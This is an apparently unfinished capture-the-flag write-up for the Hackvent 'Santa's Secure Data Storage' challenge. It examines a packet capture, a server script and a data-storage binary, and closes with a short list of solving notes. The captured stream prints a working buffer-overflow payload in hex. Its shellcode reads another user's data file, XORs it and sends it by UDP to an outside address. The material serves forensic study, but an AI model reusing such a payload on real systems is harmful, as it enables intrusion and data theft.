# HV20.24 Santa's Secure Data Storage

_In order to prevent the leakage of any flags, Santa decided to instruct his elves to implement a secure data storage, which encrypts all entered data before storing it to disk._

_According to the paradigm Always implement your own crypto the elves designed a custom hash function for storing user passwords as well as a custom stream cipher, which is used to encrypt the stored data._

_Santa is very pleased with the work of the elves and stores a flag in the application. For his password he usually uses the secure password generator `shuf -n1 rockyou.txt`._

_Giving each other a pat on the back for the good work the elves lean back in their chairs relaxedly, when suddenly the intrusion detection system raises an alert: the application seems to be exploited remotely!_

## Mission

_Santa and the elves need your help!_

_The intrusion detection system captured the network traffic of the whole attack._

_How did the attacker got in? Was (s)he able to steal the flag?_

[Download](securestorage.zip)

---

Unzip the archive:
```
$ file *
attack.pcapng: pcapng capture file - version 1.0
data:          directory
data_storage:  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4f732bdcc708dd6885deaf71d1971f8e81cc4f55, for GNU/Linux 3.2.0, not stripped
server.sh:     Bourne-Again shell script text executable, ASCII text
```

`data` folder is empty.

## attack.pcapng

It's just 1 TCP stream:
```
    00000000  77 65 6c 63 6f 6d 65 20  74 6f 20 73 61 6e 74 61   welcome  to santa
    00000010  27 73 20 73 65 63 75 72  65 20 64 61 74 61 20 73   's secur e data s
    00000020  74 6f 72 61 67 65 21                               torage!
    00000027  0a 70 6c 65 61 73 65 20  6c 6f 67 69 6e 20 77 69   .please  login wi
    00000037  74 68 20 65 78 69 73 74  69 6e 67 20 63 72 65 64   th exist ing cred
    00000047  65 6e 74 69 61 6c 73 20  6f 72 20 65 6e 74 65 72   entials  or enter
    00000057  20 6e 65 77 20 75 73 65  72 6e 61 6d 65 20 2e 2e    new use rname ..
    00000067  2e 0a 75 73 65 72 6e 61  6d 65 3e 20               ..userna me> 
00000000  65 76 69 6c 30 72 0a                               evil0r.
    00000073  66 6f 75 6e 64 20 75 73  65 72 20 27 65 76 69 6c   found us er 'evil
    00000083  30 72 27 20 2e 2e 2e 0a                            0r' .... 
    0000008B  70 61 73 73 77 6f 72 64  3e 20                     password > 
00000007  6c 6f 76 65 62 75 67 31  0a                        lovebug1 .
    00000095  77 65 6c 63 6f 6d 65 20  65 76 69 6c 30 72 21 0a   welcome  evil0r!.
    000000A5  5b 30 5d 20 73 68 6f 77  20 64 61 74 61 0a 5b 31   [0] show  data.[1
    000000B5  5d 20 65 6e 74 65 72 20  64 61 74 61 0a 5b 32 5d   ] enter  data.[2]
    000000C5  20 64 65 6c 65 74 65 20  64 61 74 61 0a 5b 33 5d    delete  data.[3]
    000000D5  20 71 75 69 74 0a                                   quit.
    000000DB  63 68 6f 69 63 65 3e 20                            choice>  
00000010  33 20 41 41 41 41 41 41  41 41 41 41 41 41 41 41   3 AAAAAA AAAAAAAA
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
00000050  41 41 10 41 40 00 00 00  00 00 68 74 78 74 00 48   AA.A@... ..htxt.H
00000060  bf 74 61 5f 64 61 74 61  2e 57 48 bf 64 61 74 61   .ta_data .WH.data
00000070  2f 73 61 6e 57 48 89 e7  48 31 f6 48 31 d2 b8 02   /sanWH.. H1.H1...
00000080  00 00 00 0f 05 48 89 c7  48 ba 00 00 01 00 01 00   .....H.. H.......
00000090  00 00 52 6a 00 6a 00 6a  00 6a 00 48 89 e6 48 ba   ..Rj.j.j .j.H..H.
000000A0  01 00 00 00 00 00 00 20  52 48 ba 00 00 00 13 37   .......  RH.....7
000000B0  01 00 00 52 ba 20 00 00  00 b8 00 00 00 00 0f 05   ...R. .. ........
000000C0  48 31 c9 81 34 0e ef be  ad de 48 83 c1 04 48 83   H1..4... ..H...H.
000000D0  f9 20 75 ef bf 02 00 00  00 be 02 00 00 00 48 31   . u..... ......H1
000000E0  d2 b8 29 00 00 00 0f 05  48 89 c7 48 89 e6 48 83   ..)..... H..H..H.
000000F0  c6 03 ba 32 00 00 00 41  ba 00 00 00 00 6a 00 49   ...2...A .....j.I
00000100  b8 02 00 00 35 c0 a8 00  2a 41 50 49 89 e0 41 b9   ....5... *API..A.
00000110  10 00 00 00 b8 2c 00 00  00 0f 05 bf 00 00 00 00   .....,.. ........
00000120  b8 3c 00 00 00 0f 05 0a                            .<...... 
    000000E3  67 6f 6f 64 20 62 79 65  21                        good bye !
```

Apparently, the last client message (starting with `AAAA...`) is the exploit.

## server.sh

Simple bash script:
```shell
#!/bin/bash
socat TCP4-LISTEN:5555,reuseaddr,fork EXEC:./data_storage,stderr;
```

Listen on port 5555 and forward to `data_storage` binary.

## data_storage

Let's start with simple things:

```
$ strings -n 8 data_storage
welcome to santa's secure data storage!
please login with existing credentials or enter new username ...
username>
username must contain at least 3 characters!
username contains invalid characters!
data/%s_pwd.txt
found user '%s' ...
password>
wrong password!
creating user '%s' ...
please set your password (max-length: 19)
welcome %s!
data/%s_data.txt
[0] show data
[1] enter data
[2] delete data
[3] quit
choice>
good bye!
unknown choice!
no data found!
your secret data:
existing data found!
[0] abort
[1] overwrite
data deleted!
```

Alright, this matches nicely the network dump. We can guess that the attacked file was `data/santa_data.txt`.

Run the binary:
```
$ ./data_storage 
welcome to santa's secure data storage!
please login with existing credentials or enter new username ...
username> hax0r
creating user 'hax0r' ...
please set your password (max-length: 19)
password> topsecret123
welcome hax0r!
[0] show data
[1] enter data
[2] delete data
[3] quit
choice> 1
data> my very secret message noone should ever know
[0] show data
[1] enter data
[2] delete data
[3] quit
choice> 3
good bye!
```

Two new files were created in `data` folder:
```
$ ls data/
hax0r_data.txt  hax0r_pwd.txt
$ xxd data/hax0r_pwd.txt 
00000000: adba a00d 3bd9 8e62 b8cf c74d 22a1 0331  ....;..b...M"..1
$ xxd data/hax0r_data.txt 
00000000: 2ff6 5c97 c0f8 4f3d 03f5 3462 8b75 c2c9  /.\...O=..4b.u..
00000010: 37ec 1f90 d2ff 0663 0fef 2965 de62 9adb  7......c..)e.b..
00000020: 17c3 38e1 e0dc 734f 70db 195f b921       ..8...sOp.._.!
```

Surely, `hax0r_pwd.txt` is a product of the custom hash function and `hax0r_data.txt` is encrypted with the 
custom stream cipher.



---

# Notes
- crypto (custom HASH function and STREAM cipher)
- exploit (OK)
- forensics (OK)
- RE
- secure password generator shuf -n1 rockyou.txt